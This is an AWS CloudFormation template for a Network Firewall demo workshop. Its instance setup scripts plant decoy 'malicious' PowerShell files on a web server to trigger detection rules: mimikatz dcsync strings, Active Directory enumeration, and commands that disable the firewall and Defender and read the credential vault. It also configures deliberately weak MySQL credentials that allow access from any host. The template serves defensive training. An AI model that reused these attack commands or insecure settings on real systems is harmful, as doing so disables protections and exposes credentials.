#Copyright 2021 Amazon.com, Inc. or its affiliates. All Rights Reserved.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

AWSTemplateFormatVersion: "2010-09-09"
Description: "AWS Network Firewall Demo with Transit Gateway native attached network firewall architecture (uksb-h57rukg0qz)"

Metadata:
  "AWS::CloudFormation::Interface":
    ParameterGroups:
      - Label:
          default: "VPC Parameters"
        Parameters: 
          - AvailabilityZoneSelection
      - Label:
          default: "EC2 Parameters"
        Parameters: 
          - LatestAmiId

Parameters:
  AvailabilityZoneSelection:
    Description: Availability Zone
    Type: AWS::EC2::AvailabilityZone::Name
    Default: us-east-1a

  LatestAmiId:
    Description: Latest EC2 AMI from Systems Manager Parameter Store
    Type: 'AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>'
    Default: "/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64"

  AmazonLinux2AMI:
    Description: Latest EC2 AMI from Systems Manager Parameter Store
    Type: 'AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>'
    Default: '/aws/service/ami-amazon-linux-latest/amzn2-ami-kernel-5.10-hvm-x86_64-gp2'
      
Resources:

  ProdVPC:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: "10.1.0.0/16"
      EnableDnsSupport: "true"
      EnableDnsHostnames: "true"
      InstanceTenancy: default
      Tags:
        - Key: Name
          Value: !Sub "prod-vpc-${AWS::StackName}"

  ProdVPCWorkloadSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: ProdVPC
      CidrBlock: "10.1.1.0/24"
      AvailabilityZone: 
        Ref: AvailabilityZoneSelection
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: !Sub "prod-vpc-workload-${AWS::StackName}"

  ProdVPCTGWSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: ProdVPC
      CidrBlock: "10.1.0.0/28"
      AvailabilityZone:
        Ref: AvailabilityZoneSelection
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: !Sub "prod-vpc-tgw-${AWS::StackName}"

  ProdEndpointSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
        GroupDescription: Allow instances to get to SSM Systems Manager
        VpcId: !Ref ProdVPC
        SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 443
          ToPort: 443
          CidrIp: 10.1.0.0/16
          Description: "Allow HTTPS traffic from Prod VPC for SSM access"
  ProdSSMEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref ProdEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssm"
        SubnetIds: 
          - !Ref ProdVPCWorkloadSubnet
        VpcEndpointType: Interface
        VpcId: !Ref ProdVPC

  ProdEC2MessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref ProdEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ec2messages"
        SubnetIds: 
          - !Ref ProdVPCWorkloadSubnet
        VpcEndpointType: Interface
        VpcId: !Ref ProdVPC

  ProdSSMMessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref ProdEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssmmessages"
        SubnetIds: 
          - !Ref ProdVPCWorkloadSubnet
        VpcEndpointType: Interface
        VpcId: !Ref ProdVPC
 
  ProdVPCRole:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_111"
            comment: "Workshop requires S3 and DynamoDB write access for PrivateLink candidate traffic generation"
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub "prod-vpc-role-${AWS::StackName}"
      Path: "/"
      ManagedPolicyArns:
        - 'arn:aws:iam::aws:policy/AmazonSSMFullAccess'
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
            Action:
              - sts:AssumeRole
      Policies:
        - PolicyName: ACMPolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: "Allow"
                Action:
                  - "acm:DescribeCertificate"
                  - "acm:GetCertificate"
                  - "acm:ListCertificates"
                  - "acm:RequestCertificate"
                  - "acm:AddTagsToCertificate"
                  - "acm:ImportCertificate"
                Resource: "*"
        - PolicyName: PrivateLinkCandidatePolicy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: "Allow"
                Action:
                  - "s3:ListAllMyBuckets"
                  - "s3:GetBucketTagging"
                Resource: "*"
              - Effect: "Allow"
                Action:
                  - "s3:ListBucket"
                  - "s3:GetObject"
                  - "s3:PutObject"
                Resource:
                  - !GetAtt PrivateLinkCandidateS3Bucket.Arn
                  - !Sub "${PrivateLinkCandidateS3Bucket.Arn}/*"
              - Effect: "Allow"
                Action:
                  - "dynamodb:PutItem"
                  - "dynamodb:GetItem"
                  - "dynamodb:Query"
                  - "dynamodb:Scan"
                Resource: !GetAtt PrivateLinkCandidateDynamoDBTable.Arn

  ProdVPCInstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Path: "/"
      Roles:
        - !Ref ProdVPCRole
        
  ProdVPCSecGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: "ICMP access from 10.0.0.0/8 and inspection VPC"
      GroupName: !Sub "prod-vpc-sec-group-${AWS::StackName}"
      VpcId: !Ref ProdVPC
      SecurityGroupIngress:
        - IpProtocol: "-1"
          CidrIp: 10.0.0.0/8
          Description: "Allow traffic from private networks"
          FromPort: "-1"
          ToPort: "-1"
        - IpProtocol: icmp
          CidrIp: 172.16.0.0/24
          Description: "Allow traffic from inspection VPC"
          FromPort: "-1"
          ToPort: "-1"
      SecurityGroupEgress:
        - CidrIp: 0.0.0.0/0
          Description: Allowing outbound connection to 0.0.0.0/0 CIDR.
          IpProtocol: "-1"
          FromPort: -1
          ToPort: -1

  ProdVPC1WorkloadInstance1:
    Type: AWS::EC2::Instance
    Properties:
      PrivateIpAddress: 10.1.1.100
      ImageId: !Ref LatestAmiId
      InstanceType: t2.micro    
      SubnetId: !Ref ProdVPCWorkloadSubnet
      IamInstanceProfile: !Ref ProdVPCInstanceProfile
      SecurityGroupIds:
        - !Ref ProdVPCSecGroup
      Tags:
        - Key: Name
          Value: "PROD - Private Internal API"
      UserData:
        Fn::Base64: |
          #!/bin/bash -ex
          # Install packages:
          sudo yum update -y
          sudo yum install -y jq httpd htop mod_ssl nc php php-common php-fpm

          # Enable and start services
          sudo systemctl enable httpd php-fpm
          sudo systemctl start httpd php-fpm

          # Configure hostname:
          sudo hostnamectl set-hostname customerdata.internalapi.com

          # Define variables (using IMDSv2):
          export TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
          curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document > /home/ec2-user/iid
          export instance_interface=$(curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/network/interfaces/macs/)
          export instance_vpcid=$(curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/network/interfaces/macs/$instance_interface/vpc-id)
          export instance_az=$(cat /home/ec2-user/iid |grep 'availability' | awk -F': ' '{print $2}' | awk -F',' '{print $1}')
          export instance_ip=$(cat /home/ec2-user/iid |grep 'privateIp' | awk -F': ' '{print $2}' | awk -F',' '{print $1}' | awk -F'"' '{print$2}')
          export instance_region=$(cat /home/ec2-user/iid |grep 'region' | awk -F': ' '{print $2}' | awk -F',' '{print $1}' | awk -F'"' '{print$2}')

          # Generate self-signed certificate
          mkdir -p /etc/httpd/ssl
          openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
              -keyout /etc/httpd/ssl/apache-selfsigned.key \
              -out /etc/httpd/ssl/apache-selfsigned.crt \
              -subj "/C=US/ST=State/L=City/O=Organization/OU=Department/CN=customerdata.internalapi.com"

          # Configure SSL
          cat <<EOL > /etc/httpd/conf.d/ssl.conf
          Listen 443
          <VirtualHost *:443>
              ServerName customerdata.internalapi.com
              ServerAdmin webmaster@localhost
              DocumentRoot /var/www/html
              SSLEngine on
              SSLCertificateFile /etc/httpd/ssl/apache-selfsigned.crt
              SSLCertificateKeyFile /etc/httpd/ssl/apache-selfsigned.key
              <Directory "/var/www/html">
                  AllowOverride All
              </Directory>
              ErrorLog logs/ssl_error_log
              CustomLog logs/ssl_access_log common
          </VirtualHost>
          EOL

          # Add index.html with hard-coded customer data
          cat <<EOT > /var/www/html/index.html
          {
              "Customer ID": "CUS12345",
              "Customer Subscription Level": "Platinum",
              "Customer Phone Number": "555-123-4567",
              "Customer DOB": "03-15-1985",
              "Customer Notes": "VIP customer - Priority Support Required"
          }
          EOT

          sudo tee /etc/httpd/conf.d/php.conf << 'EOF'
          <FilesMatch \.php$>
              SetHandler "proxy:unix:/run/php-fpm/www.sock|fcgi://localhost"
          </FilesMatch>
          AddType application/x-httpd-php .php
          EOF


          # Configure PHP-FPM pool
          sudo tee /etc/php-fpm.d/www.conf << 'EOF'
          [www]
          user = apache
          group = apache
          listen = /run/php-fpm/www.sock
          listen.owner = apache
          listen.group = apache
          pm = dynamic
          pm.max_children = 50
          pm.start_servers = 5
          pm.min_spare_servers = 5
          pm.max_spare_servers = 35
          EOF

          # Configure handlers in Apache
          sudo tee /etc/httpd/conf.d/cgi-handlers.conf << 'EOF'
          <Directory "/var/www/html">
              Options +ExecCGI
              AddHandler cgi-script .cgi
              AddHandler application/x-httpd-php .php
              <FilesMatch "\.php$">
                  SetHandler "proxy:unix:/run/php-fpm/www.sock|fcgi://localhost"
              </FilesMatch>
          </Directory>
          LoadModule proxy_module modules/mod_proxy.so
          LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so
          EOF




          # Create directories
          sudo mkdir -p /var/www/html/api

          # Create test endpoints
          sudo tee /var/www/html/api/response.php << 'EOF'
          <?php
          header('Content-Type: application/json');
          echo json_encode(['status' => 'ok']);
          ?>
          EOF

          sudo chown -R apache:apache /var/www/html
          sudo chmod 755 /var/www/html
          sudo chmod 755 /var/www/html/api


          sudo tee /var/www/html/system_mgr.cgi << 'EOF'
          #!/bin/bash
          echo "Content-type: text/plain"
          echo ""
          echo "System Manager Response"
          EOF

          # Set permissions
          sudo chmod 755 /var/www/html/system_mgr.cgi
          sudo chmod 644 /var/www/html/api/response.php
          sudo chown apache:apache /var/www/html/api/response.php
          sudo chown apache:apache /var/www/html/system_mgr.cgi

          # Create malicious PowerShell script endpoints
          sudo tee /var/www/html/secrets.ps1 << 'EOF'
          Function Invoke-SecretsDump {
              Write-Host "Initiating DC Sync operation..."
              $targetDC = "DC01.domain.local"
              
              # This matches the rule pattern "lsadump::dcsync"
              Write-Host "lsadump::dcsync /domain:domain.local /all /csv"
              
              # Additional malicious-looking content
              $methods = @(
                  "lsadump::sam",
                  "lsadump::secrets",
                  "lsadump::cache"
              )
              
              foreach ($method in $methods) {
                  Write-Host "Executing: $method"
              }
          }
          EOF

          sudo tee /var/www/html/kirby.ps1 << 'EOF'
          Function Invoke-Kirby{
              # These match the rule patterns "|24 78|" and "|24 73 6e|" (which are hex for $x and $sn)
              $x = "KIRBY_IMPLANT_ID"
              $sn = "KIRBY_SESSION_ID"
              
              # Additional malicious-looking content
              $domains = Get-ADForest | Select-Object -ExpandProperty Domains
              $dcs = foreach($domain in $domains) {
                  Get-ADDomainController -Filter * -Server $domain
              }
              
              # Enumerate domain admins
              $admins = Get-ADGroupMember "Domain Admins" -Recursive
              
              # Collect system info
              $sysinfo = Get-WmiObject Win32_ComputerSystem
              $osinfo = Get-WmiObject Win32_OperatingSystem
          }
          EOF

          sudo tee /var/www/html/psmap.ps1 << 'EOF'
          Function PsMapExec{
              [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("BASE64_ENCODED_CONTENT"))
          }
          EOF

          # Set permissions for the new files
          sudo chmod 644 /var/www/html/secrets.ps1
          sudo chmod 644 /var/www/html/psmap.ps1
          sudo chmod 644 /var/www/html/kirby.ps1
          sudo chown apache:apache /var/www/html/secrets.ps1
          sudo chown apache:apache /var/www/html/psmap.ps1
          sudo chown apache:apache /var/www/html/kirby.ps1

          # Create malicious PowerShell script endpoints
          sudo tee /var/www/html/script.ps1 << 'EOF'
          <?php
          $requestBody = file_get_contents('php://input');

          if (strpos($requestBody, 'AntiVirusProduct') !== false) {
              echo 'Get-CimInstance -ClassName "AntiVirusProduct"';
          } elseif (strpos($requestBody, 'NetFirewallProfile') !== false) {
              echo 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False';
          } elseif (strpos($requestBody, '[Byte[]]') !== false) {
              echo '[Byte[]]$var = 0x48,0x65,0x6c,0x6c,0x6f=(1)';
          } elseif (strpos($requestBody, 'PasswordVault') !== false) {
              echo '[Windows.Security.Credentials.PasswordVault].GetMethod("RetrievePassword").Invoke()';
          } else {
              header("HTTP/1.0 404 Not Found");
              echo "404 Not Found";
          }
          ?>
          EOF

          # Create malicious PowerShell enumeration script
          sudo tee /var/www/html/enum.ps1 << 'EOF'
          Get-CimInstance -ClassName "AntiVirusProduct"
          Get-Process | Where-Object {$_.ProcessName -like "*defender*"}
          Get-MpComputerStatus
          Get-NetFirewallProfile
          EOF

          # Create malicious PowerShell firewall disable script
          sudo tee /var/www/html/disable_security.ps1 << 'EOF'
          Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
          Set-MpPreference -DisableRealtimeMonitoring $true
          EOF

          # Create obfuscated PowerShell script
          sudo tee /var/www/html/obfuscated.ps1 << 'EOF'
          [Byte[]]$var = 0x48,0x65,0x6c,0x6c,0x6f=(1)
          [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("Base64EncodedPayload"))
          EOF

          # Create credential access script
          sudo tee /var/www/html/creds.ps1 << 'EOF'
          [Windows.Security.Credentials.PasswordVault].GetMethod("RetrievePassword").Invoke()
          Get-ChildItem -Path "HKLM:\SECURITY\Policy\Secrets"
          EOF

          # Keep the existing malicious script endpoints
          sudo tee /var/www/html/secrets.ps1 << 'EOF'
          Function Invoke-SecretsDump {
              lsadump::dcsync
              # Rest of script content
          }
          EOF

          sudo tee /var/www/html/kirby.ps1 << 'EOF'
          Function Invoke-Kirby{
              $x="test"
              $sn="test"
              # Rest of script content
          }
          EOF

          # Create the administrator directory first
          sudo mkdir -p /var/www/html/administrator

          sudo tee /var/www/html/administrator/index.php << 'EOF'
          <?php
          header('Content-Type: application/json');
          if ($_SERVER['REQUEST_METHOD'] === 'POST') {
              $input = file_get_contents('php://input');
              echo json_encode([
                  'received_data' => urldecode($input),
                  'raw_data' => $input,
                  'post_data' => $_POST
              ]);
          } else {
              echo json_encode(['error' => 'Invalid request method']);
          }
          EOF

          sudo chmod 644 /var/www/html/administrator/index.php
          sudo chown apache:apache /var/www/html/administrator/index.php

          sudo mkdir -p /var/www/html/admin
          sudo tee /var/www/html/admin/config.php << 'EOF'
          <?php
          error_reporting(E_ALL);
          ini_set('display_errors', 1);
          header('Content-Type: application/json');

          $response = [
              'received' => true,
              'get_params' => $_GET,
              'raw_query' => $_SERVER['QUERY_STRING']
          ];

          if (isset($_GET['password']) && is_array($_GET['password']) && isset($_GET['password'][0]) && isset($_GET['username'])) {
              $response['vulnerability_test'] = 'Potential FreePBX Authentication Bypass attempt detected';
          }

          echo json_encode($response);
          EOF

          sudo chmod 644 /var/www/html/admin/config.php
          sudo chown apache:apache /var/www/html/admin/config.php
          if command -v semanage >/dev/null 2>&1; then
              # Allow Apache to handle PHP URLs with unusual patterns
              sudo setsebool -P httpd_read_user_content 1
              sudo setsebool -P httpd_enable_cgi 1
              sudo setsebool -P httpd_can_network_relay 1
              
              # Set context for the admin directory
              sudo semanage fcontext -a -t httpd_sys_rw_content_t "/var/www/html/admin(/.*)?"
              sudo restorecon -Rv /var/www/html/admin
              
              # Allow Apache to handle unusual URL patterns
              sudo setsebool -P httpd_setrlimit 1
              sudo setsebool -P httpd_anon_write 1
              
              # Apply the changes
              sudo restorecon -Rv /var/www/html
          fi

          # Set permissions for all script files
          sudo chmod 644 /var/www/html/*.ps1
          sudo chown apache:apache /var/www/html/*.ps1

          # Set proper permissions for all files
          sudo find /var/www/html -type f -exec chmod 644 {} \;
          sudo find /var/www/html -type f -name "*.cgi" -exec chmod 755 {} \;
          sudo find /var/www/html -type f -exec chown apache:apache {} \;

          # Install PHP modules that might be needed
          sudo yum install -y php-mbstring php-xml php-json

          # Restart services to apply all changes
          sudo systemctl restart php-fpm
          sudo systemctl restart httpd

          # Verify PHP processing
          sudo tee /var/www/html/phpinfo.php << 'EOF'
          <?php phpinfo(); ?>
          EOF

          # Set SELinux contexts if SELinux is enabled
          if command -v semanage >/dev/null 2>&1; then
              sudo semanage fcontext -a -t httpd_sys_content_t "/var/www/html(/.*)?" || true
              sudo restorecon -Rv /var/www/html
              sudo setsebool -P httpd_can_network_connect on
              sudo setsebool -P httpd_can_network_connect_db on
              sudo setsebool -P httpd_unified on
              sudo setsebool -P httpd_execmem on
              sudo semanage fcontext -a -t httpd_var_run_t "/var/run/php-fpm(/.*)?" 2>/dev/null || true
              sudo restorecon -Rv /run/php-fpm 2>/dev/null || true
          fi

          # Restart Apache to apply changes
          sudo systemctl restart httpd

          # Install cronie
          sudo dnf install cronie -y

          # Start and enable crond service
          sudo systemctl start crond
          sudo systemctl enable crond

          # Create a script for DNS cache flush
          cat << 'EOF' | sudo tee /usr/local/bin/flush-dns-cache.sh
          #!/bin/bash
          systemctl restart systemd-resolved
          EOF

          # Make the script executable
          sudo chmod +x /usr/local/bin/flush-dns-cache.sh

          # Add cron job to run every minute
          echo "* * * * * root /usr/local/bin/flush-dns-cache.sh" | sudo tee /etc/cron.d/flush-dns-cache

          # Set proper permissions for the cron job file
          sudo chmod 644 /etc/cron.d/flush-dns-cache

          # Download and setup TLS inspection certificates (this instance creates and uploads)
          (
            set +e  # Don't exit on error for certificate setup
            echo "Starting certificate setup..."
            wget -O /tmp/setupcerts.zip https://ws-assets-prod-iad-r-iad-ed304a55c2ca1aee.s3.us-east-1.amazonaws.com/cbfa9f18-1175-4916-b7e7-e33dbbca9f9d/setupcerts.zip
            if [ $? -ne 0 ]; then
              echo "ERROR: Failed to download setupcerts.zip"
              exit 1
            fi
            
            cd /tmp
            unzip -o setupcerts.zip
            cd setupcerts/
            bash create_certs
            if [ $? -ne 0 ]; then
              echo "ERROR: Failed to create certificates"
              exit 1
            fi
            
            yum install ca-certificates -y
            update-ca-trust force-enable
            cp /tmp/setupcerts/out-dir/root/ca/certs/ca.cert.pem /etc/pki/ca-trust/source/anchors/
            update-ca-trust extract
            
            # Configure curl to use the system CA bundle
            echo 'export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt' >> /etc/profile.d/curl-ca-bundle.sh
            chmod +x /etc/profile.d/curl-ca-bundle.sh
            export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt
            
            # Import certificate to ACM
            aws acm import-certificate --certificate file:///tmp/setupcerts/out-dir/root/ca/intermediate/certs/intermediate.cert.pem --private-key file:///tmp/setupcerts/out-dir/root/ca/intermediate/private/intermediate.key.pem --certificate-chain file:///tmp/setupcerts/out-dir/root/ca/intermediate/certs/ca-chain.cert.pem --region us-east-1 --tags Key=name,Value=tls-inspection-certificate
            
            # Get the S3 bucket name using tags and upload CA certificate for other instances to use
            BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[].Name" --output text | xargs -n1 | while read bucket; do
              tags=$(aws s3api get-bucket-tagging --bucket "$bucket" 2>/dev/null || echo "")
              if echo "$tags" | grep -q "privatelink-candidate"; then
                echo "$bucket"
                break
              fi
            done)
            if [ -n "$BUCKET_NAME" ]; then
              echo "Uploading CA certificate to S3 bucket: $BUCKET_NAME"
              aws s3 cp /tmp/setupcerts/out-dir/root/ca/certs/ca.cert.pem s3://$BUCKET_NAME/tls-certs/ca.cert.pem
              if [ $? -eq 0 ]; then
                echo "CA certificate uploaded successfully"
              else
                echo "ERROR: Failed to upload certificate to S3"
              fi
            else
              echo "ERROR: Could not find S3 bucket with privatelink-candidate tag"
            fi
          ) || echo "Certificate setup completed with errors, continuing..."

  # Workoad Instance 2:
  ProdVPC1WorkloadInstance2:
    Type: AWS::EC2::Instance
    DependsOn: ProdVPC1WorkloadInstance1
    Properties:
      PrivateIpAddress: 10.1.1.50
      ImageId: !Ref LatestAmiId
      InstanceType: t2.micro
      IamInstanceProfile: !Ref ProdVPCInstanceProfile  
      SubnetId: !Ref ProdVPCWorkloadSubnet
      SecurityGroupIds:
        - !Ref ProdVPCSecGroup
      Tags:
        - Key: Name
          Value: "PROD - Customer Database"
      UserData:
        Fn::Base64: |
          #!/bin/bash -ex

          # Update system
          sudo yum update -y

          # Install MySQL Server
          sudo wget https://dev.mysql.com/get/mysql80-community-release-el9-1.noarch.rpm
          sudo dnf install mysql80-community-release-el9-1.noarch.rpm -y
          sudo rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2023
          sudo dnf install mysql-community-server -y
          sudo yum install nc -y

          # Start MySQL
          sudo systemctl start mysqld
          sudo systemctl enable mysqld

          # Get the temporary root password
          temp_password=$(sudo grep 'temporary password' /var/log/mysqld.log | awk '{print $NF}')

          # Configure MySQL for remote access
          sudo tee /etc/my.cnf.d/mysql-listen.cnf << EOF
          [mysqld]
          bind-address = 0.0.0.0
          EOF

          # Reset root password and create test user
          mysql --connect-expired-password -u root -p"$temp_password" << EOF
          ALTER USER 'root'@'localhost' IDENTIFIED BY 'TestPassword@1234';
          CREATE USER 'testuser'@'%' IDENTIFIED BY 'TestPassword@1234';
          GRANT ALL PRIVILEGES ON *.* TO 'testuser'@'%';
          FLUSH PRIVILEGES;
          EOF

          # Restart MySQL to apply changes
          sudo systemctl restart mysqld

          # Set hostname
          sudo hostnamectl set-hostname mysql.internal.com

          # Optional: Install some useful tools
          sudo yum install -y htop jq

          # Configure hostname (using IMDSv2):
          export TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
          curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document > /home/ec2-user/iid
          export instance_interface=$(curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/network/interfaces/macs/)
          export instance_vpcid=$(curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/network/interfaces/macs/$instance_interface/vpc-id)
          export instance_az=$(cat /home/ec2-user/iid |grep 'availability' | awk -F': ' '{print $2}' | awk -F',' '{print $1}')
          export instance_ip=$(cat /home/ec2-user/iid |grep 'privateIp' | awk -F': ' '{print $2}' | awk -F',' '{print $1}' | awk -F'"' '{print$2}')
          export instance_region=$(cat /home/ec2-user/iid |grep 'region' | awk -F': ' '{print $2}' | awk -F',' '{print $1}' | awk -F'"' '{print$2}')

          echo "MySQL installation complete. Root and testuser password is: TestPassword@1234"

          # Create a simple Python socket server that listens on port 1024
          cat << 'EOF' > /usr/local/bin/test-listener.py
          #!/usr/bin/env python3
          import socket
          import sys

          server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
          server.bind(('0.0.0.0', 1024))
          server.listen(1)

          while True:
              conn, addr = server.accept()
              data = conn.recv(1024)
              conn.close()
          EOF

          chmod +x /usr/local/bin/test-listener.py

          # Create a systemd service for the listener
          cat << 'EOF' > /etc/systemd/system/test-listener.service
          [Unit]
          Description=Test Listener on Port 1024
          After=network.target

          [Service]
          ExecStart=/usr/local/bin/test-listener.py
          Restart=always

          [Install]
          WantedBy=multi-user.target
          EOF

          # Enable and start the service
          systemctl enable test-listener.service
          systemctl start test-listener.service

          dnf install cronie -y
          # Create script to flush MySQL hosts with password
          cat << 'EOF' > /usr/local/bin/flush-mysql-hosts.sh
          #!/bin/bash
          /usr/bin/mysqladmin -u testuser -p'TestPassword@1234' flush-hosts
          EOF

          # Make the script executable
          chmod +x /usr/local/bin/flush-mysql-hosts.sh

          # Secure the script as it contains password
          chmod 700 /usr/local/bin/flush-mysql-hosts.sh

          # Add to crontab (runs every 5 minutes)
          (crontab -l 2>/dev/null; echo "*/5 * * * * /usr/local/bin/flush-mysql-hosts.sh") | crontab -

          # Download TLS inspection CA certificate from S3 and update trust store
          yum install ca-certificates -y
          update-ca-trust force-enable
          
          # Get the S3 bucket name using tags
          BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[].Name" --output text | xargs -n1 | while read bucket; do
            tags=$(aws s3api get-bucket-tagging --bucket "$bucket" 2>/dev/null || echo "")
            if echo "$tags" | grep -q "privatelink-candidate"; then
              echo "$bucket"
              break
            fi
          done)
          
          # Wait for certificate to be uploaded to S3 (retry up to 30 times with 10 second intervals)
          CERT_DOWNLOADED=false
          for i in {1..30}; do
            if [ -n "$BUCKET_NAME" ] && aws s3 cp s3://$BUCKET_NAME/tls-certs/ca.cert.pem /etc/pki/ca-trust/source/anchors/ca.cert.pem 2>/dev/null; then
              echo "Certificate downloaded successfully"
              CERT_DOWNLOADED=true
              break
            fi
            echo "Waiting for certificate to be available in S3... attempt $i"
            sleep 10
          done
          
          if [ "$CERT_DOWNLOADED" = "true" ]; then
            update-ca-trust extract
            
            # Configure curl to use the system CA bundle
            echo 'export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt' >> /etc/profile.d/curl-ca-bundle.sh
            chmod +x /etc/profile.d/curl-ca-bundle.sh
            export CURL_CA_BUNDLE=/etc/pki/tls/certs/ca-bundle.crt
          else
            echo "WARNING: Certificate not available after 30 attempts. Continuing without TLS inspection certificate."
          fi

  # Workoad Instance 3:
  ProdVPC1WorkloadInstance3:
    Type: AWS::EC2::Instance
    DependsOn: ProdVPC1WorkloadInstance1
    Properties:
      PrivateIpAddress: 10.1.1.60
      ImageId: !Ref LatestAmiId
      InstanceType: t2.micro
      IamInstanceProfile: !Ref ProdVPCInstanceProfile      
      SubnetId: !Ref ProdVPCWorkloadSubnet
      SecurityGroupIds:
        - !Ref ProdVPCSecGroup
      Tags:
        - Key: Name
          Value: "PROD - PII Sanitized Customer Database"
      UserData:
        Fn::Base64: |
          #!/bin/bash -ex

          # Update system
          sudo yum update -y

          # Install MySQL Server
          sudo wget https://dev.mysql.com/get/mysql80-community-release-el9-1.noarch.rpm
          sudo dnf install mysql80-community-release-el9-1.noarch.rpm -y
          sudo rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2023
          sudo dnf install mysql-community-server -y
          sudo yum install nc -y

          # Start MySQL
          sudo systemctl start mysqld
          sudo systemctl enable mysqld

          # Get the temporary root password
          temp_password=$(sudo grep 'temporary password' /var/log/mysqld.log | awk '{print $NF}')

          # Configure MySQL for remote access
          sudo tee /etc/my.cnf.d/mysql-listen.cnf << EOF
          [mysqld]
          bind-address = 0.0.0.0
          EOF

          # Reset root password and create test user
          mysql --connect-expired-password -u root -p"$temp_password" << EOF
          ALTER USER 'root'@'localhost' IDENTIFIED BY 'TestPassword@1234';
          CREATE USER 'testuser'@'%' IDENTIFIED BY 'TestPassword@1234';
          GRANT ALL PRIVILEGES ON *.* TO 'testuser'@'%';
          FLUSH PRIVILEGES;
          EOF

          # Restart MySQL to apply changes
          sudo systemctl restart mysqld

          # Set hostname
          sudo hostnamectl set-hostname mysql.internal.com

          # Optional: Install some useful tools
          sudo yum install -y htop jq

          # Configure hostname (using IMDSv2):
          export TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
          curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document > /home/ec2-user/iid
          export instance_interface=$(curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/network/interfaces/macs/)
          export instance_vpcid=$(curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/network/interfaces/macs/$instance_interface/vpc-id)
          export instance_az=$(cat /home/ec2-user/iid |grep 'availability' | awk -F': ' '{print $2}' | awk -F',' '{print $1}')
          export instance_ip=$(cat /home/ec2-user/iid |grep 'privateIp' | awk -F': ' '{print $2}' | awk -F',' '{print $1}' | awk -F'"' '{print$2}')
          export instance_region=$(cat /home/ec2-user/iid |grep 'region' | awk -F': ' '{print $2}' | awk -F',' '{print $1}' | awk -F'"' '{print$2}')

          # Download TLS inspection CA certificate from S3 and update trust store
          yum install ca-certificates -y
          update-ca-trust force-enable
          
          # Get the S3 bucket name using tags
          BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[].Name" --output text | xargs -n1 | while read bucket; do
            tags=$(aws s3api get-bucket-tagging --bucket "$bucket" 2>/dev/null || echo "")
